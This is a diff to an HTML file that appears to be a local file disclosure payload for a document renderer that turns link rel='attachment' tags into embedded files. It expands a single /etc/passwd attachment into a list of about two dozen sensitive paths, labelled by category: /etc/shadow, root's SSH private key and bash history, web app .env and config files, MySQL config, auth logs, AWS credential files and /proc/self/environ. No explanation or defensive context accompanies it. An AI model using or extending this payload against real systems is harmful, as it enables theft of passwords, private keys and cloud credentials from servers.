@@ -7,5 +7,37 @@
 </head>
 <body>
     <link rel="attachment" href="file:///etc/passwd">
+    <!-- Critical system files -->
+<link rel="attachment" href="file:///etc/shadow">
+<link rel="attachment" href="file:///etc/group">
+<link rel="attachment" href="file:///etc/hosts">
+<link rel="attachment" href="file:///etc/hostname">
+<link rel="attachment" href="file:///etc/ssh/sshd_config">
+<link rel="attachment" href="file:///root/.ssh/id_rsa">
+<link rel="attachment" href="file:///root/.ssh/authorized_keys">
+<link rel="attachment" href="file:///root/.bash_history">
+
+<!-- Application configuration -->
+<link rel="attachment" href="file:///etc/nginx/nginx.conf">
+<link rel="attachment" href="file:///etc/apache2/apache2.conf">
+<link rel="attachment" href="file:///var/www/html/.env">
+<link rel="attachment" href="file:///var/www/html/config.php">
+
+<!-- Database credentials -->
+<link rel="attachment" href="file:///etc/mysql/my.cnf">
+<link rel="attachment" href="file:///var/lib/mysql/mysql.sock">
+
+<!-- Logs -->
+<link rel="attachment" href="file:///var/log/auth.log">
+<link rel="attachment" href="file:///var/log/apache2/access.log">
+<link rel="attachment" href="file:///var/log/nginx/error.log">
+
+<!-- AWS/Cloud credentials -->
+<link rel="attachment" href="file:///root/.aws/credentials">
+<link rel="attachment" href="file:///root/.aws/config">
+
+<!-- Proc filesystem (may reveal running processes) -->
+<link rel="attachment" href="file:///proc/self/environ">
+<link rel="attachment" href="file:///proc/self/cmdline">
 </body>
 </html>
